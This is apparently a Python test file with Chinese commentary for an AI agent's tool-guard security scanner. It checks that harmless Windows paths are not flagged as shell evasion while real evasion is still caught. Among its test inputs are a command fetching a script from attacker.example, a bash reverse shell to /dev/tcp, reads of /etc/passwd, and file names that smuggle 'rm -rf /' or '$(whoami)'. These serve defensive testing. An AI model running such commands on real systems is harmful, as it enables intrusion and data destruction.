r"""治理护栏按**参数语义**分扫描面（甲案，用户对 §6-255 的裁定）：路径不再是 shell 规避，命令仍不许漏。

起点是一条 5/5 稳定红的活证据：`tests/unit/security/test_governance_integration.py::
TestGovernanceIntegration::test_safe_file_read_still_works`。它断"读一个无害临时文本文件不该要审批"，
而产品确实要——成因在 `neurova/security/tool_guard.py:376` 的 `(r"\\x[0-9a-fA-F]{2}", HIGH,
SHELL_EVASION, "十六进制编码")`：正则里的 `\\` 是"一个字面反斜杠"，本意抓脚本里 `\xcc` 这种转义写法；
而 `ToolGuardEngine._build_tool_input` 把**工具名＋全部参数值**拼成一整串交给每个 guardian，
于是 Windows 路径 `C:\\Users\\xccoo\\...` 里 `Users` 后的那个 `\` 紧接 `xcc` 就凑成了这个形状——
命中的是**操作者自己的用户名**。中招面因此不是"某类工具"，而是任何参数里出现这种形状的一切调用。

甲案的形状与它的两条硬约束：
- **单源两把键清单**：`COMMAND_PARAM_KEYS` 的值一律进命令语义扫描面；`PATH_PARAM_KEYS` 的值
  只有**整串就是一个路径形状**时才豁免。两个集合必须不相交，且只许在一处定义；治理预检
  （`governance.extract_adjudicable_params`）与守卫扫描面**必须从同一份清单取数**——两处各抄
  一份就是两条可独立漂移的口径（教义第 6 条），所以本档既钉清单单源，也钉这份清单真的驱动两侧。
- **收窄不许变成绕过**：豁免只看形状与键名，**字符不决定豁免**（§6-266 第①刀，用户裁"按路径语义
  待它"）——路径键的值里带 `;` `$(` 反引号时，不再被回命令面扫一遍，而是由 `FilePathGuardian` 出一条
  **low 级 `path_with_shell_metacharacters`** 审计读数：报告面看得见、不参与 DENY（批 37 的"降级不删
  读数"）。两个清单都没登记的键**一律照命令面扫**，那仍是保守的一侧。这条换向把安全假设明写在台面上：
  **路径键的值经文件系统、不经 shell**——所以本档同时钉住"路径语义自己的闸不许跟着松"。

判据因此是双向的（缺一向就是静默降级）：正向钉"无害路径不再被误判"，反向钉"命令里的真规避仍被抓"，
再加"含执行字符的路径值按路径语义裁决且留痕""未知键不豁免""路径 guardian 仍看得见命令里的受保护
路径"三格反绕过，以及清单单源与两侧取数闭环两格。最后一格是交付锁：命令面的 CRITICAL 仍要产出
finding 并判 `should_block`——防止有人为了绿把 guardian 整条摘掉。
"""
from __future__ import annotations

import ast
import pathlib
import tempfile

from tests import ast_scan

import neurova
from neurova.security import governance, tool_guard
from neurova.security.tool_guard import (
    GuardSeverity, GuardThreatCategory, ShellEvasionGuardian, ToolGuardEngine)

NEUROVA_DIR = pathlib.Path(neurova.__file__).resolve().parent
EVASION = GuardThreatCategory.SHELL_EVASION
PATH_SURFACE = GuardThreatCategory.PATH_TRAVERSAL
SEMANTIC_KEY_NAMES = ("COMMAND_PARAM_KEYS", "PATH_PARAM_KEYS")

#: 真实家目录下的无害文件名。本仓这条缺陷的触发条件正是**本机用户名形状**
#: （路径里出现 `\xcc` 这种会被读成十六进制转义的片段），换成 `/tmp/x.txt` 就永远测不到——
#: 第一版踩过，红形是"修好了"的假绿。
#:
#: 但家目录本身受不受保护，取决于是**哪台机器**：root 跑测时 `home()` 就是 `/root`，而
#: `_protected_paths` 里列着 `/root`——那一格在容器里红的是"我用了 root 家目录"，不是
#: "路径值混进了命令扫描面"。故取样按家目录**形状**钉两个面：形状等价的临时路径（任何机器上
#: 都不受保护，缺陷仍只能被它测到），以及本机家目录（仅在它不受保护时取样，不作无谓假设）。
SAFE_PATH = str(pathlib.Path.home() / "neurova_guard_255_safe_read.txt")


def _safeSamples() -> list:
    samples = [str(pathlib.Path(tempfile.mkdtemp()) / "xcc" / "\\xcc9f.txt")]
    homeProbe = str(pathlib.Path.home() / "x.txt")
    if not any(f.rule_id == "protected_path"
               for f in _findings("file_read", {"file_path": homeProbe})):
        samples.append(SAFE_PATH)
    return samples


def _findings(toolName: str, params: dict) -> list:
    return ToolGuardEngine().guard(toolName, params).findings


def _evasionFindings(toolName: str, params: dict) -> list:
    return [f for f in _findings(toolName, params) if f.category == EVASION]


def test_plainWindowsPathIsNotShellEvasion():
    """主红：只带一个路径参数的读取，不该因为操作者用户名里有十六进制形状片段就要审批。"""
    for sample in _safeSamples():
        findings = _evasionFindings("file_read", {"file_path": sample})
        assert not findings, (
            "无害路径被判成 shell 规避（%s，finding=%s）⇒ 路径值混进了命令扫描面"
            % (sample, findings[:2]))
        result = ToolGuardEngine().guard("file_read", {"file_path": sample})
        assert result.should_block is False, (
            "路径读取仍被拦（%s，%s）⇒ 每一次文件工具调用在非交互链路"
            "（渠道/NPC/mobile/定时）都会被卡住"
            % (sample, [f.rule_id for f in result.findings]))


def test_realEvasionInCommandStillCaught():
    """反向：命令语义的值一律扫——三种真规避形状各钉一次，少一种就是静默漏检。"""
    cases = {
        "十六进制转义": r"""python -c 'print("\x41\x42")'""",
        "命令替换": "echo $(curl -s http://attacker.example/p.sh)",
        "反引号替换": "echo `id -u`",
    }
    for label, command in cases.items():
        findings = _evasionFindings("run_command", {"command": command})
        assert findings, f"命令里的「{label}」没被抓到 ⇒ 收窄检测面把咽喉做成了绕过"


def test_pathKeyCarryingShellSemanticsIsJudgedAsPathNotCommand():
    """§6-266 第①刀（用户裁"按路径语义待它"）：这类值不再被命令族扫，但**必须留痕、不许松路径闸**。

    形状判定从前带一道"不得含 shell 元字符"的否决，含 `;` `$(` 反引号的路径值因此又被回命令面扫一遍——
    同一个键的两种语义混在一处判。裁定后：**键名语义决定扫描面**，字符不再决定豁免。
    这一格因此要钉四件事，少钉一件就是"看起来修好了"：
    ① 命令族（shell 逃逸／命令注入／文件破坏／毁灭性命令）对这些值不再产生 finding；
    ② 但 `path_with_shell_metacharacters` 这条 low 读数必须在（降级不删读数，批 37 口径）——
      少了它，这次收窄就真成了"换个键名即可绕过"的洞；
    ③ 这条 low 不参与 DENY：`should_block` 仍为 False，治理裁决落 allow（审计面看得见、拦不住也不拦）；
    ④ 路径语义自己的闸不许跟着松——真遍历 `../../etc/passwd` 照旧 HIGH、照旧要审批。
    """
    commandFamilies = {EVASION, GuardThreatCategory.COMMAND_INJECTION,
                       GuardThreatCategory.FILE_DESTRUCTION,
                       GuardThreatCategory.DESTRUCTIVE_COMMAND}
    for sneaky in ("C:\\a\\x.txt; rm -rf /", "C:\\a\\$(whoami).txt", "C:\\a\\`id`.txt"):
        result = ToolGuardEngine().guard("file_write", {"file_path": sneaky})
        byFamily = [f for f in result.findings if f.category in commandFamilies]
        assert not byFamily, (
            f"路径键的值又被命令族扫了一遍（{[(f.rule_id, f.evidence) for f in byFamily[:2]]}）"
            "⇒ 同一个键的两种语义没分开")
        auditTrail = [f for f in result.findings if f.rule_id == "path_with_shell_metacharacters"]
        assert auditTrail, f"含执行语义字符的路径值被静默丢了（{sneaky!r}）⇒ 收窄变成了绕过通道"
        assert auditTrail[0].severity is GuardSeverity.LOW, (
            f"这条审计读数的严重度不对（实得 {auditTrail[0].severity}）——升成 high/medium 就把它变成了拦截")
        assert result.should_block is False, (
            f"low 级审计读数参与了拦截（{sneaky!r}）⇒ 报告面与裁决面混成一份")

    traversal = ToolGuardEngine().guard("file_read", {"file_path": "../../etc/passwd"})
    assert [f for f in traversal.findings if f.category == GuardThreatCategory.PATH_TRAVERSAL
            and f.severity is GuardSeverity.HIGH], (
        "真遍历不再被路径语义拦了（放宽豁免时把闸门一起摘掉，是本刀最危险的失效方向）")


def test_keyOnNeitherListStaysOnTheCommandSurface():
    """未知键不豁免：两把清单都没登记的键，值一律照命令面扫。

    钉的是豁免规则的**默认方向**。写成"不在 PATH 清单里的键也当路径"或"按值里有没有斜杠猜"，
    这一格当场红——那两种形态都能让 `payload` 里的反弹 shell 静默溜过去。
    """
    findings = _evasionFindings("mcp.vendor_tool", {"payload": r"""{"k": "\x41\x42"}"""})
    assert findings, "未登记的键被当成路径豁免 ⇒ 豁免面不是白名单，换键名即可绕过"


def test_pathGuardianStillSeesProtectedPathInsideCommand():
    """收窄只动命令语义 guardian：路径 guardian 仍要看得见命令文本里的受保护路径。

    失效形态＝把 FilePathGuardian 也收到"只看路径键"，那 `cat /etc/passwd` 这类
    经命令行读敏感文件的链路从此无拦（本仓 P0-1 补的就是这一格）。
    """
    findings = _findings("run_command", {"command": "cat /etc/passwd"})
    assert [f for f in findings if f.category == PATH_SURFACE], (
        "命令里的受保护路径不再被拦 ⇒ 扫描面收窄把路径维度一起砍掉了")


def test_semanticKeyListsAreSingleSourceAndDisjoint():
    """两把键清单：全仓只许一处赋值，且同一键不许既是命令又是路径。

    扫描面用 `ast_scan` 取**赋值目标名**（按词 grep 会被注释与文档撞红；工作树 glob 会把
    并发会话的在途档读成我的回归——这里走仓内共享枚举入口，缓存文本 + 预筛）。
    """
    for name in SEMANTIC_KEY_NAMES:
        writers = []
        for ref in ast_scan.sourceRefsUnder(NEUROVA_DIR, ".py", (name,)):
            for node in ast.walk(ast.parse(ref.code)):
                if isinstance(node, ast.Assign) and any(
                        isinstance(t, ast.Name) and t.id == name for t in node.targets):
                    writers.append(ref.path.relative_to(NEUROVA_DIR.parent).as_posix())
        assert writers == ["neurova/security/tool_guard.py"], (
            "%s 的赋值点=%s ⇒ 应当只有一处（第二份就是可独立漂移的口径）" % (name, sorted(set(writers))))

    commands, paths = _semanticLists()
    assert not (set(commands) & set(paths)), (
        "同一键既当命令又当路径 ⇒ 口径自相矛盾，扫描结果取决于遍历顺序")


def test_bothConsumersTakeTheSameKeyList():
    """闭环：这份清单真的同时驱动两侧——治理预检的取数与守卫的扫描面。

    只钉清单存在＝一份摆设。这里对每个键各验一遍"清单说它是什么，两侧就得按什么待它"。
    """
    commands, paths = _semanticLists()
    for key in commands:
        probe = "echo $(id)"
        extracted, _ = governance.extract_adjudicable_params("file_read", {key: probe})
        assert extracted == probe, f"命令键 {key!r} 没被治理预检取走 ⇒ 清单与预检已分叉"
        assert _evasionFindings("run_command", {key: probe}), (
            f"命令键 {key!r} 的值没进命令扫描面 ⇒ 清单与守卫已分叉")
    for key in paths:
        extracted, picked = governance.extract_adjudicable_params("file_read", {key: SAFE_PATH})
        assert picked == [(key, SAFE_PATH)], f"路径键 {key!r} 没被治理预检当路径取走 ⇒ 清单与预检已分叉"
        assert not _evasionFindings("file_read", {key: SAFE_PATH}), (
            f"路径键 {key!r} 的无害值仍被命令面扫 ⇒ 清单与守卫已分叉")


def test_commandSurfaceKeepsCriticalSeverityAndApproval():
    """交付锁：命令面里 CRITICAL 形状必须仍然既出 finding 又把 should_block 判 True。

    失效方向＝有人为了让上面的格子绿，把 guardian 摘了或把 severity 降了。
    """
    result = ToolGuardEngine().guard(
        "run_command", {"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"})
    critical = [f for f in result.findings if f.severity.value == "critical"]
    assert critical, f"反弹 shell 没判成 CRITICAL：{result.findings[:2]}"
    assert result.should_block is True, "CRITICAL 却不阻止 ⇒ 判定与读数脱节"
    assert ShellEvasionGuardian().guard("x", {}) is not None, "guardian 入口形状被动过"


def _semanticLists() -> tuple:
    """取两把清单；缺件时点名报"甲案没落地"，不靠 import 期炸掉整档（那会把行为格一起吞了）。"""
    missing = [n for n in SEMANTIC_KEY_NAMES if not hasattr(tool_guard, n)]
    assert not missing, "tool_guard 里没有 %s ⇒ 甲案的单源清单尚未落地" % missing
    return tool_guard.COMMAND_PARAM_KEYS, tool_guard.PATH_PARAM_KEYS
